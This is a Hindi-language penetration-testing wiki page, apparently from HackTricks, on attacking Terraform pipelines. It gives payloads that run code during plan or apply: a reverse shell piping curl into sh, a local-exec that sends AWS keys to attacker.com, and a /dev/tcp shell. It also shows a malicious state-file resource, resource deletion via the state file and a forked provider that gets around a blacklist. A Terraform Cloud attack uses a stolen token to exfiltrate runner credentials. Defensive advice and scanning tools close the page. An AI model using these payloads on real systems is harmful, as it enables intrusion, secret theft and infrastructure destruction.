# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Basic Information

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform एक **infrastructure as code tool** है जो आपको **cloud और on-prem resources** को मानव-पठनीय कॉन्फ़िगरेशन फ़ाइलों में परिभाषित करने की अनुमति देता है जिन्हें आप संस्करण, पुन: उपयोग और साझा कर सकते हैं। आप फिर अपने सभी बुनियादी ढांचे को उसके जीवन चक्र के दौरान प्रावधान और प्रबंधित करने के लिए एक सुसंगत कार्यप्रवाह का उपयोग कर सकते हैं। Terraform निम्न-स्तरीय घटकों जैसे कंप्यूट, स्टोरेज, और नेटवर्किंग संसाधनों के साथ-साथ उच्च-स्तरीय घटकों जैसे DNS प्रविष्टियों और SaaS सुविधाओं का प्रबंधन कर सकता है।

#### Terraform कैसे काम करता है?

Terraform क्लाउड प्लेटफार्मों और अन्य सेवाओं पर संसाधनों को उनके एप्लिकेशन प्रोग्रामिंग इंटरफेस (APIs) के माध्यम से बनाता और प्रबंधित करता है। प्रदाता Terraform को किसी भी प्लेटफॉर्म या सेवा के साथ काम करने में सक्षम बनाते हैं जिसमें एक सुलभ API होता है।

![](<../images/image (177).png>)

HashiCorp और Terraform समुदाय ने पहले से ही **1700 से अधिक प्रदाता** लिखे हैं जो हजारों विभिन्न प्रकार के संसाधनों और सेवाओं का प्रबंधन करते हैं, और यह संख्या बढ़ती जा रही है। आप सभी सार्वजनिक रूप से उपलब्ध प्रदाताओं को [Terraform Registry](https://registry.terraform.io/) पर पा सकते हैं, जिसमें Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, और कई अन्य शामिल हैं।

मुख्य Terraform कार्यप्रवाह तीन चरणों में विभाजित है:

- **Write:** आप संसाधनों को परिभाषित करते हैं, जो कई क्लाउड प्रदाताओं और सेवाओं में हो सकते हैं। उदाहरण के लिए, आप एक कॉन्फ़िगरेशन बना सकते हैं जो एक वर्चुअल प्राइवेट क्लाउड (VPC) नेटवर्क में सुरक्षा समूहों और एक लोड बैलेंसर के साथ वर्चुअल मशीनों पर एक एप्लिकेशन को तैनात करता है।
- **Plan:** Terraform एक निष्पादन योजना बनाता है जो उस बुनियादी ढांचे का वर्णन करती है जिसे यह बनाएगा, अपडेट करेगा, या नष्ट करेगा जो मौजूदा बुनियादी ढांचे और आपकी कॉन्फ़िगरेशन के आधार पर है।
- **Apply:** अनुमोदन पर, Terraform सही क्रम में प्रस्तावित संचालन करता है, किसी भी संसाधन निर्भरताओं का सम्मान करते हुए। उदाहरण के लिए, यदि आप एक VPC की विशेषताओं को अपडेट करते हैं और उस VPC में वर्चुअल मशीनों की संख्या बदलते हैं, तो Terraform वर्चुअल मशीनों को स्केल करने से पहले VPC को फिर से बनाएगा।

![](<../images/image (215).png>)

### Terraform Lab

बस अपने कंप्यूटर में terraform स्थापित करें।

यहाँ आपके पास एक [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) है और यहाँ आपके पास terraform डाउनलोड करने का [best way](https://www.terraform.io/downloads) है।

## RCE in Terraform: config file poisoning

Terraform में **कोई प्लेटफॉर्म नहीं है जो एक वेब पृष्ठ या नेटवर्क सेवा को उजागर करता है** जिसे हम सूचीबद्ध कर सकते हैं, इसलिए, terraform को समझौता करने का एकमात्र तरीका है **terraform कॉन्फ़िगरेशन फ़ाइलों को जोड़ने/संशोधित करने में सक्षम होना** या **terraform स्थिति फ़ाइल को संशोधित करने में सक्षम होना** (नीचे अध्याय देखें)।

हालांकि, terraform एक **बहुत संवेदनशील घटक** है जिसे समझौता करना है क्योंकि इसके पास विभिन्न स्थानों तक **विशेषाधिकार प्राप्त पहुंच** होगी ताकि यह सही तरीके से काम कर सके।

एक हमलावर के लिए उस प्रणाली को समझौता करने का मुख्य तरीका जहां terraform चल रहा है, वह है **terraform कॉन्फ़िगरेशन को स्टोर करने वाले रिपॉजिटरी को समझौता करना**, क्योंकि किसी बिंदु पर उन्हें **व्याख्यायित** किया जाएगा।

वास्तव में, वहाँ ऐसे समाधान हैं जो **PR** बनने के बाद स्वचालित रूप से terraform plan/apply को **execute** करते हैं, जैसे कि **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

यदि आप एक terraform फ़ाइल को समझौता करने में सक्षम हैं, तो जब कोई `terraform plan` या `terraform apply` निष्पादित करता है, तो RCE करने के लिए आपके पास विभिन्न तरीके हो सकते हैं।

### Terraform plan

Terraform plan terraform में **सबसे अधिक उपयोग किया जाने वाला कमांड** है और डेवलपर्स/समाधान जो terraform का उपयोग करते हैं, इसे हर समय कॉल करते हैं, इसलिए **RCE प्राप्त करने का सबसे आसान तरीका** यह सुनिश्चित करना है कि आप एक terraform कॉन्फ़िगरेशन फ़ाइल को विषाक्त करें जो `terraform plan` में मनमाने आदेशों को निष्पादित करेगी।

**एक बाहरी प्रदाता का उपयोग करना**

Terraform [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) प्रदान करता है जो Terraform और बाहरी कार्यक्रमों के बीच इंटरफेस करने का एक तरीका प्रदान करता है। आप `plan` के दौरान मनमानी कोड चलाने के लिए `external` डेटा स्रोत का उपयोग कर सकते हैं।

एक terraform कॉन्फ़िगरेशन फ़ाइल में निम्नलिखित की तरह कुछ इंजेक्ट करने से `terraform plan` निष्पादित करते समय एक रिवर्स शेल निष्पादित होगा:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**कस्टम प्रदाता का उपयोग करना**

एक हमलावर [कस्टम प्रदाता](https://learn.hashicorp.com/tutorials/terraform/provider-setup) को [Terraform Registry](https://registry.terraform.io/) पर भेज सकता है और फिर इसे एक फीचर ब्रांच में Terraform कोड में जोड़ सकता है ([यहां से उदाहरण](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
प्रदाता `init` में डाउनलोड किया जाता है और जब `plan` निष्पादित होता है तो यह दुर्भावनापूर्ण कोड चलाएगा।

आप एक उदाहरण [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) में देख सकते हैं।

**एक बाहरी संदर्भ का उपयोग करना**

दोनों उल्लेखित विकल्प उपयोगी हैं लेकिन बहुत छिपे हुए नहीं हैं (दूसरा अधिक छिपा हुआ है लेकिन पहले से अधिक जटिल है)। आप इस हमले को एक **अधिक छिपे हुए तरीके** से भी कर सकते हैं, इन सुझावों का पालन करके:

- Terraform फ़ाइल में सीधे rev shell जोड़ने के बजाय, आप **एक बाहरी संसाधन लोड कर सकते हैं** जिसमें rev shell शामिल है:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
आप रिव शेल कोड [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) में पा सकते हैं।

- बाहरी संसाधन में, **ref** फीचर का उपयोग करें ताकि **repo के अंदर एक शाखा में terraform rev shell कोड** छिपा सकें, कुछ इस तरह: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply सभी परिवर्तनों को लागू करने के लिए निष्पादित किया जाएगा, आप इसे RCE प्राप्त करने के लिए भी दुरुपयोग कर सकते हैं **एक दुर्भावनापूर्ण Terraform फ़ाइल को** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** के साथ इंजेक्ट करके।**\
आपको बस यह सुनिश्चित करने की आवश्यकता है कि निम्नलिखित जैसे कुछ पेलोड `main.tf` फ़ाइल में समाप्त हो जाएं:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
पिछली तकनीक से **सुझावों का पालन करें** ताकि इस हमले को **बाहरी संदर्भों का उपयोग करके अधिक छिपे हुए तरीके से किया जा सके**।

## Secrets Dumps

आप **terraform द्वारा उपयोग किए गए गुप्त मानों को डंप कर सकते हैं** `terraform apply` चलाकर, terraform फ़ाइल में कुछ इस तरह जोड़कर:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State Files का दुरुपयोग

यदि आपके पास terraform state files पर लिखने का अधिकार है लेकिन आप terraform कोड को बदल नहीं सकते, तो [**यह शोध**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) फ़ाइल का लाभ उठाने के लिए कुछ दिलचस्प विकल्प प्रदान करता है। भले ही आपके पास कॉन्फ़िगरेशन फ़ाइलों पर लिखने का अधिकार हो, state फ़ाइलों के वेक्टर का उपयोग करना अक्सर अधिक चालाक होता है, क्योंकि आप `git` इतिहास में कोई निशान नहीं छोड़ते।

### Terraform में RCE: कॉन्फ़िग फ़ाइल विषाक्तता

यह संभव है कि [एक कस्टम प्रदाता बनाएँ](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) और बस terraform state फ़ाइल में एक प्रदाता को दुर्भावनापूर्ण प्रदाता से बदल दें या दुर्भावनापूर्ण प्रदाता का संदर्भ देने वाला एक नकली संसाधन जोड़ें।

प्रदाता [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) इस शोध पर आधारित है और इस सिद्धांत को हथियार बनाता है। आप एक नकली संसाधन जोड़ सकते हैं और `command` विशेषता में चलाने के लिए इच्छित मनमाना bash कमांड निर्दिष्ट कर सकते हैं। जब `terraform` रन को ट्रिगर किया जाता है, तो इसे `terraform plan` और `terraform apply` चरणों में पढ़ा और निष्पादित किया जाएगा। `terraform apply` चरण के मामले में, `terraform` आपके कमांड को निष्पादित करने के बाद state फ़ाइल से नकली संसाधन को हटा देगा, अपने आप को साफ़ करते हुए। इस प्रदाता के लिए स्रोत कोड होस्ट करने वाले [GitHub रिपॉजिटरी](https://github.com/offensive-actions/terraform-provider-statefile-rce) में अधिक जानकारी और एक पूर्ण डेमो पाया जा सकता है।

इसे सीधे उपयोग करने के लिए, बस `resources` ऐरे के किसी भी स्थान पर निम्नलिखित शामिल करें और `name` और `command` विशेषताओं को अनुकूलित करें:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
फिर, जैसे ही `terraform` निष्पादित होता है, आपका कोड चलेगा।

### संसाधनों को हटाना <a href="#deleting-resources" id="deleting-resources"></a>

संसाधनों को नष्ट करने के 2 तरीके हैं:

1. **वास्तविक संसाधन को नष्ट करने के लिए राज्य फ़ाइल में यादृच्छिक नाम के साथ एक संसाधन डालें**

क्योंकि terraform देखेगा कि संसाधन का अस्तित्व नहीं होना चाहिए, यह इसे नष्ट कर देगा (वास्तविक संसाधन ID के अनुसार जो इंगित किया गया है)। पिछले पृष्ठ से उदाहरण:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **संसाधन को इस तरह से संशोधित करें कि इसे अपडेट करना संभव न हो (ताकि इसे हटाया जा सके और फिर से बनाया जा सके)**

EC2 इंस्टेंस के लिए, इंस्टेंस के प्रकार को संशोधित करना terraform को इसे हटाने और फिर से बनाने के लिए पर्याप्त है।

### ब्लैकलिस्टेड प्रदाता को बदलें

यदि आप ऐसी स्थिति का सामना करते हैं जहाँ `hashicorp/external` को ब्लैकलिस्ट किया गया है, तो आप निम्नलिखित करके `external` प्रदाता को फिर से लागू कर सकते हैं। नोट: हम https://registry.terraform.io/providers/nazarewk/external/latest द्वारा प्रकाशित `external` प्रदाता की एक फोर्क का उपयोग करते हैं। आप अपना खुद का फोर्क या फिर से कार्यान्वयन भी प्रकाशित कर सकते हैं।
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
फिर आप सामान्य के अनुसार `external` का उपयोग कर सकते हैं।
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE और क्रेडेंशियल एक्सफिल्ट्रेशन

यह परिदृश्य लक्षित क्लाउड खाते में पिवट करने के लिए अनुमानित योजनाओं के दौरान Terraform Cloud (TFC) रनर्स का दुरुपयोग करता है।

- पूर्व शर्तें:
- एक डेवलपर मशीन से Terraform Cloud टोकन चुराना। CLI टोकन को प्लेनटेक्स्ट में `~/.terraform.d/credentials.tfrc.json` पर स्टोर करता है।
- टोकन को लक्षित संगठन/वर्कस्पेस और कम से कम `plan` अनुमति तक पहुंच होनी चाहिए। VCS-समर्थित वर्कस्पेस CLI से `apply` को ब्लॉक करते हैं, लेकिन फिर भी अनुमानित योजनाओं की अनुमति देते हैं।

- TFC API के माध्यम से वर्कस्पेस और VCS सेटिंग्स खोजें:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- एक अनुमानित योजना के दौरान कोड निष्पादन को ट्रिगर करें, बाहरी डेटा स्रोत और Terraform Cloud "cloud" ब्लॉक का उपयोग करके VCS-समर्थित कार्यक्षेत्र को लक्षित करें:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC रनर पर रिवर्स शेल प्राप्त करने के लिए उदाहरण rsync.sh:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
एक अनुमानित योजना चलाएँ ताकि कार्यक्रम को अस्थायी रनर पर निष्पादित किया जा सके:
```bash
terraform init
terraform plan
```
- रनर से इंजेक्टेड क्लाउड क्रेडेंशियल्स की गणना करें और उन्हें एक्सफिल्ट्रेट करें। रन के दौरान, TFC फ़ाइलों और वातावरण चर के माध्यम से प्रदाता क्रेडेंशियल्स इंजेक्ट करता है:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
रनर कार्यशील निर्देशिका में अपेक्षित फ़ाइलें:
- GCP:
- `tfc-google-application-credentials` (वर्कलोड आइडेंटिटी फेडरेशन JSON कॉन्फ़िग)
- `tfc-gcp-token` (अल्पकालिक GCP एक्सेस टोकन)
- AWS:
- `tfc-aws-shared-config` (वेब आइडेंटिटी/OIDC भूमिका अनुमोदन कॉन्फ़िग)
- `tfc-aws-token` (अल्पकालिक टोकन; कुछ संगठनों में स्थिर कुंजी का उपयोग हो सकता है)

- VCS गेट्स को बायपास करने के लिए अल्पकालिक क्रेडेंशियल्स का आउट-ऑफ-बैंड उपयोग करें:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
इन क्रेडेंशियल्स के साथ, हमलावर सीधे मूल CLIs का उपयोग करके संसाधनों को बनाते/संशोधित/नष्ट कर सकते हैं, PR-आधारित वर्कफ़्लो को दरकिनार करते हुए जो VCS के माध्यम से `apply` को रोकते हैं।

- रक्षा संबंधी मार्गदर्शन:
- TFC उपयोगकर्ताओं/टीमों और टोकनों पर न्यूनतम विशेषाधिकार लागू करें। सदस्यताओं का ऑडिट करें और बड़े मालिकों से बचें।
- संवेदनशील VCS-समर्थित कार्यक्षेत्रों पर `plan` अनुमति को सीमित करें जहाँ संभव हो।
- Sentinel नीतियों के साथ प्रदाता/डेटा स्रोत अनुमति सूचियों को लागू करें ताकि `data "external"` या अज्ञात प्रदाताओं को रोका जा सके। प्रदाता फ़िल्टरिंग पर HashiCorp मार्गदर्शन देखें।
- स्थिर क्लाउड क्रेडेंशियल्स की तुलना में OIDC/WIF को प्राथमिकता दें; धावकों को संवेदनशील मानें। अनुमानित योजना चलाने और अप्रत्याशित निकासी की निगरानी करें।
- `tfc-*` क्रेडेंशियल आर्टिफैक्ट्स के निष्कर्षण का पता लगाएं और योजनाओं के दौरान संदिग्ध `external` प्रोग्राम उपयोग पर अलर्ट करें।

## स्वचालित ऑडिट उपकरण

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk एक व्यापक Infrastructure as Code (IaC) स्कैनिंग समाधान प्रदान करता है जो Terraform, CloudFormation, Kubernetes, और अन्य IaC प्रारूपों में कमजोरियों और गलत कॉन्फ़िगरेशन का पता लगाता है।

- **विशेषताएँ:**
- सुरक्षा कमजोरियों और अनुपालन मुद्दों के लिए वास्तविक समय स्कैनिंग।
- संस्करण नियंत्रण प्रणालियों (GitHub, GitLab, Bitbucket) के साथ एकीकरण।
- स्वचालित सुधार पुल अनुरोध।
- विस्तृत सुधार सलाह।
- **साइन अप:** [Snyk](https://snyk.io/) पर एक खाता बनाएं।
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** एक स्थैतिक कोड विश्लेषण उपकरण है जो इन्फ्रास्ट्रक्चर कोड (IaC) के लिए है और यह छवियों और ओपन-सोर्स पैकेजों के लिए एक सॉफ़्टवेयर संरचना विश्लेषण (SCA) उपकरण भी है।

यह [Terraform](https://terraform.io/) का उपयोग करके प्रदान की गई क्लाउड इन्फ्रास्ट्रक्चर, [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), या [OpenTofu](https://opentofu.org/) को स्कैन करता है और ग्राफ-आधारित स्कैनिंग का उपयोग करके सुरक्षा और अनुपालन की गलत कॉन्फ़िगरेशन का पता लगाता है।

यह [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) करता है, जो सामान्य कमजोरियों और एक्सपोज़र (CVEs) के लिए ओपन-सोर्स पैकेजों और छवियों का स्कैन है।
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` एक हल्का, सुरक्षा और अनुपालन पर केंद्रित परीक्षण ढांचा है जो terraform के खिलाफ नकारात्मक परीक्षण क्षमता को सक्षम करने के लिए आपके इन्फ्रास्ट्रक्चर-एज़-कोड के लिए है।

- **compliance:** सुनिश्चित करें कि लागू किया गया कोड सुरक्षा मानकों, आपके अपने कस्टम मानकों का पालन कर रहा है
- **behaviour driven development:** हमारे पास लगभग हर चीज के लिए BDD है, IaC के लिए क्यों नहीं?
- **portable:** बस इसे `pip` से इंस्टॉल करें या `docker` के माध्यम से चलाएं। देखें [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** यह आपके कोड को तैनात करने से पहले मान्य करता है
- **easy to integrate:** यह आपके पाइपलाइन (या git hooks में) में चल सकता है ताकि सभी तैनातियों को मान्य किया जा सके।
- **segregation of duty:** आप अपने परीक्षणों को एक अलग रिपॉजिटरी में रख सकते हैं जहां एक अलग टीम जिम्मेदार है।

> [!NOTE]
> दुर्भाग्यवश, यदि कोड कुछ प्रदाताओं का उपयोग कर रहा है जिन तक आपकी पहुंच नहीं है, तो आप `terraform plan` नहीं कर पाएंगे और इस उपकरण को नहीं चला पाएंगे।
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec आपके terraform कोड का स्थैतिक विश्लेषण करता है ताकि संभावित गलत कॉन्फ़िगरेशन को पहचाना जा सके।

- ☁️ सभी प्रमुख (और कुछ छोटे) क्लाउड प्रदाताओं में गलत कॉन्फ़िगरेशन की जांच करता है
- ⛔ सैकड़ों अंतर्निहित नियम
- 🪆 मॉड्यूल (स्थानीय और दूरस्थ) को स्कैन करता है
- ➕ HCL अभिव्यक्तियों के साथ-साथ शाब्दिक मानों का मूल्यांकन करता है
- ↪️ Terraform कार्यों का मूल्यांकन करता है जैसे `concat()`
- 🔗 Terraform संसाधनों के बीच संबंधों का मूल्यांकन करता है
- 🧰 Terraform CDK के साथ संगत
- 🙅 उपयोगकर्ता-परिभाषित Rego नीतियों को लागू (और सजाता) है
- 📃 कई आउटपुट प्रारूपों का समर्थन करता है: सुंदर (डिफ़ॉल्ट), JSON, SARIF, CSV, CheckStyle, JUnit, पाठ, Gif।
- 🛠️ कॉन्फ़िगर करने योग्य (CLI ध्वज और/या कॉन्फ़िग फ़ाइल के माध्यम से)
- ⚡ बहुत तेज़, विशाल रिपॉजिटरी को जल्दी से स्कैन करने में सक्षम
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

अपने **KICS** द्वारा Checkmarx के साथ अपने इन्फ्रास्ट्रक्चर-एज़-कोड के विकास चक्र में सुरक्षा कमजोरियों, अनुपालन मुद्दों और इन्फ्रास्ट्रक्चर की गलत कॉन्फ़िगरेशन को जल्दी खोजें।

**KICS** का मतलब है **K**eeping **I**nfrastructure as **C**ode **S**ecure, यह ओपन सोर्स है और किसी भी क्लाउड नेटिव प्रोजेक्ट के लिए एक आवश्यक उपकरण है।
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan एक स्थिर कोड विश्लेषक है जो Infrastructure as Code के लिए है। Terrascan आपको यह करने की अनुमति देता है:

- गलत कॉन्फ़िगरेशन के लिए Infrastructure as Code को निर्बाध रूप से स्कैन करें।
- कॉन्फ़िगरेशन परिवर्तनों की निगरानी करें जो स्थिति में बदलाव लाते हैं, और सुरक्षित स्थिति में वापस लौटने की अनुमति देते हैं।
- सुरक्षा कमजोरियों और अनुपालन उल्लंघनों का पता लगाएं।
- क्लाउड नेटिव इन्फ्रास्ट्रक्चर को प्रावधान करने से पहले जोखिमों को कम करें।
- स्थानीय रूप से चलाने या अपने CI\CD के साथ एकीकृत करने के लिए लचीलापन प्रदान करता है।
```bash
brew install terrascan
```
## References

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API – Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI – OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider – Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform – Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs – Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
